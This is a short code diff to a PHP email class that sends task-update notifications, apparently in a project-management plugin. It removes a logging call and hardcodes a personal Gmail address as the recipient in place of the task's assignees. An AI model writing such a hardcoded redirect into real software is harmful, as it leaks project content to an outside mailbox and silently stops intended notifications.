@@ -21,7 +21,7 @@ class Update_Task_Notification extends Email {
 
         $task->load('assignees.assigned_user', 'projects.managers', 'updater');
         $users = array();
-        pm_log('task', $task_raw);
+        
         foreach ($task->assignees->toArray() as $assignee ) {
             if( $this->is_enable_user_notification( $assignee['assigned_to'] ) ){
                 if( $this->is_enable_user_notification_for_notification_type( $assignee['assigned_to'] , '_cpm_email_notification_update_task' ) ){
@@ -48,7 +48,7 @@ class Update_Task_Notification extends Email {
 
         $message = $this->get_content_html( $template_name, $task_raw );
 
-        $this->send( $users, $subject, $message );
+        $this->send( 'joy.mishu@gmail.com', $subject, $message );
 
     }
 
